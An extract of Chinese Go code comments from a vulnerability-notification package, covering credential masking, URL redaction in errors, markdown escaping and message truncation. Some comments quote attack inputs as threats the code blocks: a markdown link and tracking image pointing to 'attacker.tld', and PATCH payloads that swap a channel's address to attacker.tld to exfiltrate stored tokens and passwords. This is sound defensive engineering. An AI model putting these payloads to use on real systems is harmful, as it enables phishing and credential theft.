+300 source/notify/http.go:230 // 非 *url.Error（如重定向策略返回的错误）也可能带地址，统一走脱敏。
+301 source/notify/http.go:234 // redactURLsInText 把一段文本里出现的 http(s) 地址替换成脱敏形态。
+302 source/notify/http.go:236 // 用于兜底那些拿不到结构化字段的错误（重定向策略错误、第三方库的自定义错误）。
+303 source/notify/http.go:237 // 只识别 http/https 前缀，按空白与引号切分——地址不会包含这两类字符。
+304 source/notify/http_test.go:12 // 本文件覆盖 doJSON 的 HTTP 层错误分级。
+305 source/notify/http_test.go:14 // 为什么要单独测：各渠道适配器只管平台自己的业务错误码（钉钉 errcode、
+306 source/notify/http_test.go:15 // 飞书 code、Telegram ok 字段），而**HTTP 层**的分级是 doJSON 统一做的，
+307 source/notify/http_test.go:16 // 两者是两道独立的防线。少了这道，一个返回 503 的中转网关会被当成永久失败、
+308 source/notify/http_test.go:17 // 直接放弃重试；而一个 403 会被当成可重试、白白退避三轮。
+309 source/notify/http_test.go:64 // 状态码必须出现在错误里，否则用户无从判断是自己配错了还是对端挂了。
+310 source/notify/http_test.go:65 // 断言数字而不是 Go 的英文 StatusText：本包的文案是中文的
+311 source/notify/http_test.go:66 // （与项目其它部分一致），数字才是语言无关、可稳定断言的部分。
+312 source/notify/http_test.go:74 // TestDoJSONIncludesResponseSnippet 覆盖 snippet：对端返回的错误说明要带回来，
+313 source/notify/http_test.go:75 // 否则用户只知道「失败了」，不知道对端为什么拒绝。
+314 source/notify/http_test.go:87 // TestDoJSONSnippetIsSingleLineAndBounded 约束 snippet 的形态：
+315 source/notify/http_test.go:88 // 它对端响应会原样进 last_error 列与前端表格，多行/超长会破坏排版与载荷。
+316 source/notify/http_test.go:90 // 带换行、制表符与 5000 字符超长内容的响应。
+317 source/notify/http_test.go:101 // snippet 上限 200 字符 + 固定前缀，总量必须远小于原始响应。
+318 source/notify/http_test.go:107 // TestDoJSONRejectsOversizedResponse 确认读取有上限：对端异常返回超大内容时
+319 source/notify/http_test.go:108 // 不能把整个响应读进内存（投递历史里每一条都会存一份 last_error）。
+320 source/notify/markdown.go:8 // 本文件是「Markdown 系」渠道（钉钉、企业微信）共用的消息渲染。
+321 source/notify/markdown.go:9 // 飞书用卡片 JSON、Telegram 用 HTML、邮件用 HTML，各自在适配器里渲染。
+322 source/notify/markdown.go:11 // maxAssetsShown 是消息里最多列出几个资产。一个漏洞可能锚定几十个资产，
+323 source/notify/markdown.go:12 // 全列会挤爆消息且没有信息价值——第 4 个之后的域名没人会在 IM 里看。
+324 source/notify/markdown.go:15 // maxSummaryRunes 是摘要被压缩到多少字符。IM 消息是「提示去看详情」，
+325 source/notify/markdown.go:16 // 不是报告本体，完整内容在平台里。
+326 source/notify/markdown.go:19 // markdownReservedBytes 预留给消息头部（汇总行 + 级别分布 + 可能的截断提示）
+327 source/notify/markdown.go:20 // 与尾部（平台链接）。按整条打包时把这部分从预算里扣掉，保证头尾不会被截掉——
+328 source/notify/markdown.go:21 // 头尾一旦被截，读者连「这是哪一批、还有多少条没显示」都看不出来。
+329 source/notify/markdown.go:24 // markdownEscape 转义 markdown 元字符。
+330 source/notify/markdown.go:26 // 为什么必须做：漏洞标题、摘要、类型、资产展示名全都来自**不可信来源**——
+331 source/notify/markdown.go:27 // 标题与摘要出自模型输出（模型读的是被测目标的响应），资产的 url 则是扫描
+332 source/notify/markdown.go:28 // 得到的完整 URL（含目标可控的查询串）。不转义的话，一条标题为
+333 source/notify/markdown.go:30 //	登录口 SQL 注入\n[紧急：点此验证账号](http://attacker.tld)
+334 source/notify/markdown.go:32 // 的漏洞会在安全工程师的钉钉/飞书里渲染成**可点击的外链**；而
+335 source/notify/markdown.go:33 // `![](http://attacker.tld/beacon)` 会在渲染时被客户端拉取，等于通报了
+336 source/notify/markdown.go:34 // 「这条漏洞已经被看过」并泄露阅读者 IP。就算是无恶意的内容，注入的粗体或
+337 source/notify/markdown.go:35 // 引用块也能把下面的严重漏洞挤出折叠线。
+338 source/notify/markdown.go:37 // 转义集合覆盖标题/链接/强调/列表/引用/删除线这几类会改变结构或产生可点击
+339 source/notify/markdown.go:38 // 元素的字符。`\` 必须最先处理，否则会把后面补上的反斜杠再次转义。
+340 source/notify/markdown.go:58 // markdownText 把不可信文本压成单行并转义，供 markdown 正文使用。
+341 source/notify/markdown.go:59 // 单行化是转义之外的另一半：换行本身就能伪造出新的列表项或引用块，
+342 source/notify/markdown.go:60 // 而转义字符挡不住它。
+343 source/notify/markdown.go:65 // markdownTitle 返回消息标题（IM 平台的标题栏/卡片标题），内容是**未转义的原文**。
+344 source/notify/markdown.go:67 // 这里刻意不做转义：这个标题被四种语境的渲染器共用——markdown 正文、Telegram 的
+345 source/notify/markdown.go:68 // HTML、飞书卡片的 plain_text、以及通用 Webhook 的 JSON 与邮件主题。每个语境的
+346 source/notify/markdown.go:69 // 转义规则都不同（markdown 转义塞进 HTML 会留下可见的反斜杠，塞进 JSON 会污染
+347 source/notify/markdown.go:70 // 数据），所以转义必须由各自的输出端负责，见 writeItem / feishuItemLines /
+348 source/notify/markdown.go:71 // telegramEscape。曾经在共享函数里加过 markdown 转义，结果 Telegram 消息里
+349 source/notify/markdown.go:72 // 出现了 `\(1\)` 这种可见的反斜杠。
+350 source/notify/markdown.go:84 // markdownBody 渲染消息正文，返回正文与**实际写入的条目数**。
+351 source/notify/markdown.go:86 // 返回值 kept 是这次投递真正送达的条目数，调用方据此只把前 kept 条标记为
+352 source/notify/markdown.go:87 // 已送达——被渠道长度上限挡在外面的条目必须留待下一批，而不是跟着一起被
+353 source/notify/markdown.go:88 // 标记成功。这正是「静默丢失」的来源：消息被截断了，但投递记录显示全部送达，
+354 source/notify/markdown.go:89 // 没有任何地方能看出后半截从未发出。
+355 source/notify/markdown.go:91 // maxBytes<=0 表示不限制。
+356 source/notify/markdown.go:99 // 单条消息即使超长也照发（由最终截断兜底）：一条漏洞的部分信息
+357 source/notify/markdown.go:100 // 也好过一条都不发。
+358 source/notify/markdown.go:124 // markdownBatchIntro 渲染汇总消息的开头：时间窗、条数与级别分布。
+359 source/notify/markdown.go:125 // 有了这些，收到汇总的人不用点进平台就能判断这批需不需要立刻处理。
+360 source/notify/markdown.go:127 // items 是**实际装下**的条目，total 是本批应有的总数。两者不同时必须明说
+361 source/notify/markdown.go:128 // 「还有多少条在下一条消息里」——否则读者会以为消息头写的那个数字就是全部，
+362 source/notify/markdown.go:129 // 而后面那些从未发出的条目在界面上完全不存在。
+363 source/notify/markdown.go:140 // 按级别给出分布，让读者一眼看到有没有严重项。只统计**本条实际包含**的
+364 source/notify/markdown.go:141 // 条目，保证「严重 3」和下面能数出来的条目一致。
+365 source/notify/markdown.go:159 // writeItem 渲染单个漏洞条目。
+366 source/notify/markdown.go:161 // prefix 用于汇总列表的序号；single=true 时渲染完整版（含摘要与回链），
+367 source/notify/markdown.go:162 // 汇总列表里只渲染一行摘要——否则 50 条汇总会变成一篇长文档。
+368 source/notify/markdown.go:164 // 所有来自外部的内容（标题/类型/资产/摘要）都过 markdownText：
+369 source/notify/markdown.go:165 // 单行化 + 转义。回链是管理员配置的 public_base_url 拼出来的，不是不可信内容，
+370 source/notify/markdown.go:166 // 且必须是可点的链接，所以原样输出。
+371 source/notify/markdown.go:170 // 汇总模式：单行呈现，资产与摘要压缩后跟在后面。
+372 source/notify/mask.go:9 // MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
+373 source/notify/mask.go:10 // 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
+374 source/notify/mask.go:12 // 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息
+375 source/notify/mask.go:13 // （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。
+376 source/notify/mask.go:16 // MaskedValue 生成一个掩码值：
+377 source/notify/mask.go:18 //	"__masked__"              原值太短，不给任何提示
+378 source/notify/mask.go:19 //	"__masked__:…ab12cd"      带上原值末 6 位作为辨识提示
+379 source/notify/mask.go:21 // 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、
+380 source/notify/mask.go:22 // 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以
+381 source/notify/mask.go:23 // 还原凭据，但足以让配置者认出「是我那个群」。
+382 source/notify/mask.go:31 // IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。
+383 source/notify/mask.go:34 // MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。
+384 source/notify/mask.go:36 // 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，
+385 source/notify/mask.go:37 // 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。
+386 source/notify/mask.go:38 // 非凭据字段原样保留，UI 才能正常展示。
+387 source/notify/mask.go:54 // headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道
+388 source/notify/mask.go:55 // 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。
+389 source/notify/mask.go:65 // ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
+390 source/notify/mask.go:66 // 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
+391 source/notify/mask.go:78 // PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
+392 source/notify/mask.go:80 // 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
+393 source/notify/mask.go:81 // 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
+394 source/notify/mask.go:82 // 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
+395 source/notify/mask.go:83 // 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
+396 source/notify/mask.go:85 //	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
+397 source/notify/mask.go:86 //	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
+398 source/notify/mask.go:87 //	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
+399 source/notify/mask.go:89 // 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
+400 source/notify/mask.go:90 // 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
+401 source/notify/mask.go:92 // 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
+402 source/notify/mask.go:93 //   - 给出新值 → 用新值
+403 source/notify/mask.go:94 //   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
+404 source/notify/mask.go:95 //   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
+405 source/notify/mask.go:97 // 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
+406 source/notify/mask.go:98 // 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
+407 source/notify/mask.go:99 // （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
+408 source/notify/mask.go:100 // 比报错更难排查。宁可让操作者多填一次。
+409 source/notify/mask.go:109 // 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
+410 source/notify/mask.go:110 // 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
+411 source/notify/mask.go:111 // 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
+412 source/notify/mask.go:112 // "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
+413 source/notify/mask.go:114 // 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
+414 source/notify/mask.go:115 // 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
+415 source/notify/mask.go:120 // 找出真正被改掉的目的地键。掩码值等于「没改」。
+416 source/notify/mask.go:136 // 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
+417 source/notify/mask.go:140 // 地址变了：要求对每个凭据键显式表态。
+418 source/notify/mask.go:158 // rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
+419 source/notify/mask.go:160 // 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
+420 source/notify/mask.go:161 // 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
+421 source/notify/mask.go:162 // 既表达不了「保持不变」，又会被当成真实值存进库。
+422 source/notify/mask.go:184 // sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
+423 source/notify/mask.go:185 // 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
+424 source/notify/mask.go:187 // 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，
+425 source/notify/mask.go:188 // 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个
+426 source/notify/mask.go:189 // 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用
+427 source/notify/mask.go:190 // 官方地址）会走成这条路径——
+428 source/notify/mask.go:192 //	新建时存下 base_url:""  →  第一次保存被 MergeConfig 删键
+429 source/notify/mask.go:193 //	→ 第二次保存时 incoming 是 ""、stored 缺键，被判成「地址变了」
+430 source/notify/mask.go:194 //	→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」
+431 source/notify/mask.go:196 // 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。
+432 source/notify/mask.go:209 // isBlankConfigValue 判定一个配置值是否为「空」。
+433 source/notify/mask.go:210 // 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
+434 source/notify/mask.go:211 // 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。
+435 source/notify/mask.go:220 // MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
+436 source/notify/mask.go:222 // 规则：
+437 source/notify/mask.go:223 //   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）
+438 source/notify/mask.go:224 //   - incoming 里值为空串的键 → 视为显式清空，删除该键
+439 source/notify/mask.go:225 //   - 其余键 → 用 incoming 的值覆盖
+440 source/notify/mask.go:226 //   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）
+441 source/notify/mask.go:228 // 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，
+442 source/notify/mask.go:229 // 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。
+443 source/notify/mask.go:230 // 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式
+444 source/notify/mask.go:231 // （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。
+445 source/notify/mask_test.go:18 // 末 6 位要保留，用户才能认出是哪个机器人。
+446 source/notify/mask_test.go:28 // 短凭据如果也暴露末 6 位，等于把整个凭据暴露出去。
+447 source/notify/mask_test.go:54 // 非凭据字段必须原样保留，否则 UI 无法展示。
+448 source/notify/mask_test.go:61 // 渠道类型无法识别时，宁可让 UI 显示空配置，也不要把可能含凭据的原始内容吐回去。
+449 source/notify/mask_test.go:69 // 掩码是展示层行为，不能反过来把库里的真值改掉。
+450 source/notify/mask_test.go:79 // 用户只改了 method，浏览器提交的是掩码值+新 method。
+451 source/notify/mask_test.go:100 // 没提到的字段保留（局部更新语义）。
+452 source/notify/mask_test.go:117 // TestPrepareConfigUpdateBlocksDestinationSwap 是本包最重要的一条安全不变量：
+453 source/notify/mask_test.go:118 // **改目标地址不能把旧凭据带过去**。
+454 source/notify/mask_test.go:120 // 这些用例用的正是攻击形状的输入（只改地址、对凭据避而不谈），
+455 source/notify/mask_test.go:121 // 而不是「防御逻辑的正确输入」——只测后者的话，防御没生效也照样全绿。
+456 source/notify/mask_test.go:128 // wantMissing 是预期被点名的凭据键。
+457 source/notify/mask_test.go:163 // 掩码值 = 「沿用旧凭据」，在地址变更的语境下同样必须拒绝。
+458 source/notify/mask_test.go:197 // 错误信息要能指导操作者怎么修。
+459 source/notify/mask_test.go:205 // TestPrepareConfigUpdateAllowsLegitimateEdits 反向用例：正常的编辑不能被误拦，
+460 source/notify/mask_test.go:206 // 否则这个防护会因为「太烦」而被绕过或删掉。
+461 source/notify/mask_test.go:264 // TestPrepareConfigUpdatePortTypeTolerance 覆盖一个容易误判的细节：
+462 source/notify/mask_test.go:265 // 前端提交的端口是 JSON number（float64），库里读回来也是 float64，
+463 source/notify/mask_test.go:266 // 但两个值的类型可能不同（如 int vs float64）。用 == 比较会把「没改」判成「改了」，
+464 source/notify/mask_test.go:267 // 从而对只改了名字的用户弹出「请重新填写密码」——假警报会让人不再信任这个防护。
+465 source/notify/mask_test.go:270 // 同一个端口，以 int 形式提交。
+466 source/notify/mask_test.go:274 // 真的换了端口则必须拦。
+467 source/notify/mask_test.go:280 // TestPrepareConfigUpdateSurvivesRepeatedSaveWithBlankDestination 覆盖「可留空的
+468 source/notify/mask_test.go:281 // 目的地字段」这条路径：Telegram 的 base_url 留空表示用官方 API 地址。
+469 source/notify/mask_test.go:283 // 曾经这里会让渠道从第二次保存起永久保存失败：
+470 source/notify/mask_test.go:285 //	新建时库里存下 base_url:""（创建路径直接存前端提交的 config，不走 MergeConfig）
+471 source/notify/mask_test.go:286 //	→ 第一次保存，MergeConfig 把空串当显式清空、delete 掉该键
+472 source/notify/mask_test.go:287 //	→ 第二次保存，incoming 仍是 ""、而 stored 里已经没这个键，被判成「地址变了」
+473 source/notify/mask_test.go:288 //	→ bot_token 是掩码回显值 → 400「目标地址已变更，请同时重新填写凭据字段」
+474 source/notify/mask_test.go:290 // 用户什么都没改，却从此再也存不上，除非重新粘贴一遍 Bot Token。
+475 source/notify/mask_test.go:294 // 前端 buildConfig() 对该渠道的每个字段定义都提交一个值：凭据回填掩码，
+476 source/notify/mask_test.go:295 // 空文本框提交空串。这里完整复现它的输出，而不是只提交「改动的键」。
+477 source/notify/mask_test.go:304 // 第一次保存：只改了渠道名字，config 原样回传。
+478 source/notify/mask_test.go:313 // 第二次保存：提交内容与上次完全一致，用户什么都没改。
+479 source/notify/mask_test.go:318 // 第三次，确认不是「只错一次」而是稳定可保存。
+480 source/notify/mask_test.go:322 // 凭据必须一路保留下来，没有被空串逻辑连带清掉。
+481 source/notify/mask_test.go:328 // TestPrepareConfigUpdateStillGuardsBlankDestinationChanges 是上一条用例的配对
+482 source/notify/mask_test.go:329 // 断言：把空串与「键不存在」视为等价，**不能**连带放过真正的地址变更。
+483 source/notify/mask_test.go:330 // 这两个方向都是真实的凭据外发路径——Telegram 的 Bot Token 走在 URL 路径里，
+484 source/notify/mask_test.go:331 // 换了 base_url 就等于把 Token 送给新地址。
+485 source/notify/mask_test.go:333 // 方向一：从「空」（官方地址）换到自建地址。
+486 source/notify/mask_test.go:342 // 方向二：把自建地址清空（= 换回官方 API）同样是地址变更。
+487 source/notify/mask_test.go:353 // 与 SecretKeys 同理：渠道若忘记声明目的地键，PrepareConfigUpdate 就保护不到它。
+488 source/notify/mask_test.go:365 // 编译器已经强制每个渠道实现 SecretKeys，这里再确认一遍「没有渠道在掩码上
+489 source/notify/mask_test.go:366 // 交白卷」——返回空切片的渠道意味着它的凭据会明文回显到浏览器。
+490 source/notify/mask_test.go:382 // TestPrepareConfigUpdateRejectsMaskedInContainer 覆盖审计指出的一处口子：
+491 source/notify/mask_test.go:383 // 把掩码哨兵塞进**非字符串**结构（如 webhook.headers 是个对象）时，
+492 source/notify/mask_test.go:384 // MergeConfig 只认「字符串且带前缀」为掩码，于是字面量 "__masked__" 会被当成
+493 source/notify/mask_test.go:385 // 真实头值存进库——后续鉴权静默失效，且没有任何报错。
+494 source/notify/mask_test.go:391 // 对象内部夹带掩码哨兵。
+495 source/notify/mask_test.go:398 // 整体提交对象（真实新值）照常接受。
+496 source/notify/pack_test.go:9 // 本文件覆盖「按整条打包」这个修复：汇总消息超出渠道长度上限时，必须**按整条**
+497 source/notify/pack_test.go:10 // 截断并把没装下的条目数如实报出来，让调用方只标记真正送达的那些。
+498 source/notify/pack_test.go:12 // 之前的做法是渲染完整篇再截断、然后整批标记已送达：消息后半截凭空消失，
+499 source/notify/pack_test.go:13 // 而投递历史显示全部成功——漏洞就这么没了，且没有任何地方能发现。
+500 source/notify/pack_test.go:16 // 200 条中文汇总，必然远超企微 4096 字节。
+501 source/notify/pack_test.go:29 // 头部必须如实说明本条只包含多少条、其余有多少条——否则读者会把头部
+502 source/notify/pack_test.go:30 // 那个数字当成全部。
+503 source/notify/pack_test.go:34 // 只应包含前 kept 条。
+504 source/notify/pack_test.go:47 // 0 = 不限制
+505 source/notify/pack_test.go:57 // 预算小到连一条都装不下时，仍要发出一条（由最终截断兜底）。
+506 source/notify/pack_test.go:58 // 否则一条超长漏洞会把整批永久卡在原地：每次领取都装不下、每次都不发。
+507 source/notify/pack_test.go:71 // 空消息没有可送达的条目。
+508 source/notify/pack_test.go:80 // Telegram 按**字符数**限长；用字节口径会把中文消息压到三分之一。
+509 source/notify/pack_test.go:101 // 这两个渠道不截断正文，整批都算送达。
+510 source/notify/pack_test.go:106 // 通过渲染器的返回值间接确认：markdownBody(0) 不限制时全部保留。
+511 source/notify/pack_test.go:112 // TestMarkdownEscapesUntrustedContent 是「不可信内容不得改变消息结构」的回归测试。
+512 source/notify/pack_test.go:113 // 标题与摘要来自模型输出（模型读的是被测目标响应），资产名来自被测目标的 URL。
+513 source/notify/pack_test.go:118 // 结果里必须出现（转义形态）
+514 source/notify/pack_test.go:119 // 结果里不得出现（未转义形态）
+515 source/notify/pack_test.go:127 // 换行必须被折叠（否则能伪造出新的列表项/引用块）；
+516 source/notify/pack_test.go:128 // 方括号与圆括号必须被转义（否则是可点击的外链）。
+517 source/notify/pack_test.go:165 // 单条模式的写Item 是三个 markdown 渠道共用的渲染路径。
+518 source/notify/pack_test.go:184 // TestMarkdownEscapeBackslashFirst 锁住转义顺序：反斜杠必须最先处理，
+519 source/notify/pack_test.go:185 // 否则会给后面补上的反斜杠再套一层，输出里出现双反斜杠。
+520 source/notify/pack_test.go:192 // TestTelegramTitleHasNoMarkdownEscapes 锁住一个具体的回归：
+521 source/notify/pack_test.go:193 // markdown 转义不能泄漏到 Telegram 的 HTML 输出里（曾经在共享的标题函数里
+522 source/notify/pack_test.go:194 // 加过转义，结果 Telegram 消息里出现 `\(1\)` 这种可见反斜杠）。
+523 source/notify/redact_test.go:15 // 本文件是不变量测试：**任何**从渠道实现里冒出来的错误文本都不得携带凭据。
+524 source/notify/redact_test.go:17 // 为什么单独拉一个文件：最初的渠道用例只覆盖了成功路径与平台业务错误，
+525 source/notify/redact_test.go:18 // 完全没看传输层失败。而恰恰是传输层错误（连接被拒/DNS 失败/超时）最危险——
+526 source/notify/redact_test.go:19 // http.Client.Do 返回的 *url.Error 会把**完整 URL** 打进错误文本，而本功能
+527 source/notify/redact_test.go:20 // 这几家的凭据就在 URL 里。凭据顺着这条串流到了四个出口：
+528 source/notify/redact_test.go:22 //	notification_deliveries.last_error  → 明文落库
+529 source/notify/redact_test.go:23 //	GET /api/notify/deliveries 响应     → 绕过渠道配置的掩码，回显给浏览器
+530 source/notify/redact_test.go:24 //	服务端日志                          → 常被外发留存
+531 source/notify/redact_test.go:25 //	测试发送接口的 502 响应             → 直接弹在前端
+532 source/notify/redact_test.go:27 // 所以这里不只测一个函数，而是逐个渠道真发一次必然失败的请求，断言错误文本
+533 source/notify/redact_test.go:28 // 里找不到那个凭据。
+534 source/notify/redact_test.go:30 // credentialCases 覆盖所有「凭据在 URL 里」的渠道形态：
+535 source/notify/redact_test.go:31 // 钉钉/企微在 query，飞书在路径末段，Telegram 在路径中段。
+536 source/notify/redact_test.go:70 // leakProbeToken 是一个绝不可能是真实凭据的哨兵值，用于在错误文本里搜它。
+537 source/notify/redact_test.go:73 // TestChannelErrorsNeverLeakCredentials 是核心不变量。
+538 source/notify/redact_test.go:77 // 必然失败的对端：127.0.0.1:1 无人监听，走的是连接被拒这条路径。
+539 source/notify/redact_test.go:89 // TestChannelErrorsNeverLeakCredentialsInPermanentPath 覆盖永久失败分支：
+540 source/notify/redact_test.go:90 // URL 校验失败、平台业务错误等也会把错误文本外传，同样不能带凭据。
+541 source/notify/redact_test.go:97 // 地址里带凭据但格式非法 → 触发 validateHTTPURL / url.Parse 分支。
+542 source/notify/redact_test.go:135 // 脱敏结果本身不得再含有原地址的任何路径/查询片段。
+543 source/notify/redact_test.go:144 // 不可解析的输入绝不回显原串。
+544 source/notify/redact_test.go:152 // TestRedactTransportErrorStripsURL 直接盯住 *url.Error 这个具体类型：
+545 source/notify/redact_test.go:153 // 它是 http.Client.Do 的返回类型，也是泄露的第一现场。
+546 source/notify/redact_test.go:169 // Op 也要保留（POST 还是 GET 对排查有意义）。
+547 source/notify/redact_test.go:175 // TestRedactURLsInTextHandlesFallback 兜底路径：非 *url.Error 的自定义错误
+548 source/notify/redact_test.go:176 // （如重定向策略返回的错误）里的地址同样要被摘掉。
+549 source/notify/redact_test.go:184 // 不含地址的文本原样保留。
+550 source/notify/redact_test.go:190 // TestCrossHostRedirectRefused 覆盖「凭据在 URL 里 + 跟随跨主机跳转 = 交出凭据」。
+551 source/notify/redact_test.go:191 // httptest 的两个服务监听在 127.0.0.1 的不同端口，端口不同即 Host 不同，
+552 source/notify/redact_test.go:192 // 正好构成跨主机跳转。
+553 source/notify/redact_test.go:218 // TestSameHostRedirectAllowed 反向用例：同主机跳转（如末尾补斜杠）必须仍然可用，
+554 source/notify/redact_test.go:219 // 否则会把正常工作流一起挡掉。
+555 source/notify/redact_test.go:223 // 同主机、同端口的跳转。
+556 source/notify/render.go:10 // TruncateBytes 把 s 截断到不超过 max 字节，保证结果是合法 UTF-8 且不切断字符。
+557 source/notify/render.go:12 // 为什么必须按字符边界切：企微群机器人的 markdown 有 4096 **字节**硬上限（不是
+558 source/notify/render.go:13 // 字符数），而中文一个字 3 字节。直接按字节切片会把一个汉字切成两半，产出非法
+559 source/notify/render.go:14 // UTF-8——平台侧要么整条拒收，要么显示成乱码方块。这里的做法是先从预算位置
+560 source/notify/render.go:15 // 往前回退到最近的 rune 起始字节（utf8.RuneStart 判定续字节 0b10xxxxxx）。
+561 source/notify/render.go:17 // max<=0 表示不限制。截断后追加省略号，除非 max 小到装不下省略号。
+562 source/notify/render.go:25 // max 比省略号还短：放弃省略号，纯截断，避免结果反而超出 max。
+563 source/notify/render.go:36 // OneLine 把多行文本压成单行：折叠所有空白，再按字符数截断。
+564 source/notify/render.go:37 // 用于 IM 消息的标题行——摘要里常有换行，直接塞进表格/标题会撑坏排版。
+565 source/notify/render.go:38 // max<=0 表示不限制长度。
+566 source/notify/render.go:44 // TruncateRunes 把 s 截断到不超过 max 个字符（而非字节），超出时追加省略号。
+567 source/notify/render.go:45 // max<=0 表示不限制。
+568 source/notify/render.go:47 // 与 TruncateBytes 的区别在于平台口径：企微按字节限长，Telegram 按字符数限长。
+569 source/notify/render.go:48 // 用错口径不会报错，只会让消息被切得远比预期短（中文 1 字 = 3 字节，
+570 source/notify/render.go:49 // 按字节切 4096 只剩约 1365 字），所以两个函数都必须保留、按渠道选用。
+571 source/notify/render.go:64 // TruncateHTML 按字符数截断 HTML 片段，并保证不产生半截标签。
+572 source/notify/render.go:66 // 直接对 HTML 做字符截断会切出 `<a href="htt` 这种残缺标签，平台解析器要么
+573 source/notify/render.go:67 // 报错拒收整条、要么把后续正文当成属性值吞掉。这里的做法是：先按字符截断，
+574 source/notify/render.go:68 // 再检查尾部是否有未闭合的 `<`，有就退到它之前。
+575 source/notify/render.go:70 // 不做标签配平（补全 </b> 之类）：Telegram 的 HTML 解析器会自动闭合未闭合标签，
+576 source/notify/render.go:71 // 而自己实现配平要处理属性里的引号、注释、自闭合标签，复杂度与收益不成比例。
+577 source/notify/render.go:77 // 尾部若是 `<` 开头的残片（最后出现 `<` 之后没有 `>`），退回 `<` 之前。
+578 source/notify/render.go:81 // 尾部若是被切断的 HTML 实体（如 `&amp;` 被切成 `&amp`），同样要退回去。
+579 source/notify/render.go:82 // 实体残片在一个只认实体的解析器里可能让**整条消息**被拒收——一条超过
+580 source/notify/render.go:83 // 长度上限的汇总消息本来就常见，不值得为此丢掉整条通知。
+581 source/notify/render.go:90 // packItemCount 计算在预算内能**完整**放下多少条，供汇总消息按整条打包。
+582 source/notify/render.go:92 // 为什么要按整条而不是渲染完整篇再截断：截断会让后半截条目凭空消失，
+583 source/notify/render.go:93 // 而它们的投递记录仍会被标记为已送达——消息里看不出来、投递历史里也看不出来，
+584 source/notify/render.go:94 // 漏洞就这么没了。按整条打包后，装不下的条目留在库里成为下一批，
+585 source/notify/render.go:95 // 调用方拿到的 kept 就是本条消息真正送达的条数。
+586 source/notify/render.go:97 // 参数：maxSize<=0 表示不限制；reserve 是给消息头部/尾部预留的量；
+587 source/notify/render.go:98 // size 负责计量（各平台口径不同：企微/钉钉按字节，Telegram 按字符数——
+588 source/notify/render.go:99 // 用错口径不会报错，只会让中文消息被压到远小于上限）；
+589 source/notify/render.go:100 // render 把第 idx 条渲染成它的实际文本——长度因内容而异，不能靠估算。
+590 source/notify/render.go:102 // 至少返回 1（只要还有条目）。单条极端超长时也要发出这一条、由调用方的
+591 source/notify/render.go:103 // 最终截断兜底，否则一条超长漏洞会把整批永久卡在原地。
+592 source/notify/render.go:122 // byteSize / runeSize 是 packItemCount 的两种计量口径，命名出来避免调用处
+593 source/notify/render.go:123 // 出现裸的 func(s string) int 闭包，否则很难一眼看出用的是哪种口径。
+594 source/notify/render.go:127 // assetLine 把资产列表渲染成一行展示文本，超过 limit 个时省略其余并标注总数。
+595 source/notify/render.go:128 // 一个漏洞可能锚定几十个资产，全列出来会挤爆消息。
